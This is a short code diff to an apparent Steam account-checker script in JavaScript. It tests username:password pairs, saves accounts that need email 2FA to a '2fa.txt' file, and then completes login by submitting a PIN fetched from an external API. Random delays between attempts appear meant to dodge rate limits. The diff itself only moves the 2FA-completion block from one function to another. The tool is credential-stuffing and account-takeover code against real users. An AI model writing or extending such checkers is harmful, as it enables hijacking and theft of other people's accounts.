@@ -158,18 +158,6 @@ async function checkAccount(user, passw) {
     } else if (loginData.emailauth_needed) {
       console.log(chalk.yellow(`⚠️ 2FA Enabled — NEED VERIFY [${user}]`));
       fs.appendFileSync(path.join(resultDir, "2fa.txt"), `${user}:${passw}\n`);
-      await (async () => {
-        const { browser, page } = await steamLogin.steamLogin(user, passw);
-        console.log(
-          chalk.yellow(`⏳ Waiting for PIN input from API for [${user}]...`)
-        );
-
-        const pinFromApi = await waitForPin(user);
-        console.log("🚀 ~ await ~ pinFromApi:", pinFromApi);
-        await steamLogin.submitPin(page, pinFromApi);
-
-        console.log(chalk.green(`🎯 Finished 2FA for [${user}]`));
-      })();
       return "2fa_verified";
     } else {
       console.log(chalk.red(`❌ BAD ACCOUNT [${user}]`));
@@ -182,7 +170,21 @@ async function checkAccount(user, passw) {
 }
 
 async function startCheckingInternal(user, pass) {
-  await checkAccount(user, pass);
+  check = await checkAccount(user, pass);
+  if (check === "2fa_verified") {
+    await (async () => {
+      const { browser, page } = await steamLogin.steamLogin(user, pass);
+      console.log(
+        chalk.yellow(`⏳ Waiting for PIN input from API for [${user}]...`)
+      );
+
+      const pinFromApi = await waitForPin(user);
+      console.log("🚀 ~ await ~ pinFromApi:", pinFromApi);
+      await steamLogin.submitPin(page, pinFromApi);
+
+      console.log(chalk.green(`🎯 Finished 2FA for [${user}]`));
+    })();
+  }
   const delay = Math.floor(Math.random() * 5000) + 8000;
   console.log(chalk.blue(`⏳ Waiting ${delay / 1000}s`));
   await sleep(delay);
